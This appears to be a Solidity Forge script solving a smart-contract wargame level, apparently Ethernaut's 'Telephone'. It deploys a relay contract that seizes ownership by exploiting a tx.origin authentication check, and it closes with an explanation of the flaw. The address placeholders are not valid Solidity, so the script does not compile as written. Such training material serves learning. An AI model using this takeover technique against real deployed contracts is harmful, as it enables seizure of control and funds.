// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Import Forge script utility
import "../lib/forge-std/src/Script.sol";
import {Telephone} from "../src/Telephone.sol";  // Assuming Telephone contract is imported here

// Contract to perform the attack on the Telephone contract
contract TelephoneExploit {
    // Instance of the vulnerable Telephone contract
    Telephone public telephoneContract;

    // Address to which ownership should be transferred (the player's address)
    address public newOwnerAddress;

    // Constructor to initialize the contract instance and new owner address
    constructor(address _telephoneContractAddress, address _newOwnerAddress) {
        telephoneContract = Telephone(_telephoneContractAddress);
        newOwnerAddress = _newOwnerAddress;
    }

    // Function to call the changeOwner function of the Telephone contract
    function executeAttack() public {
        // Call the changeOwner function directly, passing the new owner address
        telephoneContract.changeOwner(newOwnerAddress);
    }
}

// Forge script to automate the attack on the Telephone contract
contract TelephoneAttackScript is Script {

    // Instance of the TelephoneExploit contract
    TelephoneExploit exploitInstance;

    // Function to initiate and run the attack
    function run() external {
        // Start broadcasting the transactions using the private key from the .env file
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        // Deploy the TelephoneExploit contract, passing the Telephone contract address and player's address
        exploitInstance = new TelephoneExploit(0xYourInstanceAddressHere, 0xYourPlayerAddressHere);

        // Execute the attack by calling executeAttack() to change ownership
        exploitInstance.executeAttack();

        // Stop broadcasting transactions after the attack is executed
        vm.stopBroadcast();
    }
}

/* 
Explanation:

This solution directly calls the `changeOwner` function of the vulnerable `Telephone` contract, using a regular function call instead of a low-level call.

1. **TelephoneExploit Contract**:
   - The `TelephoneExploit` contract receives the `Telephone` contract address and the player's address (new owner) via the constructor.
   - The `executeAttack()` function calls the `changeOwner(address)` function of the `Telephone` contract directly, passing the player's address as the new owner.

2. **TelephoneAttackScript**:
   - This Forge script deploys the `TelephoneExploit` contract and broadcasts transactions to the network.
   - The attack is performed by calling the `executeAttack()` function, which changes the ownership of the `Telephone` contract.
   
**Core Vulnerability**:
- The vulnerability arises from the `Telephone` contract's use of `tx.origin` instead of `msg.sender` for verifying the caller's identity. This allows the attack to succeed when the call is forwarded through the `TelephoneExploit` contract, as `tx.origin` remains the player's address.
*/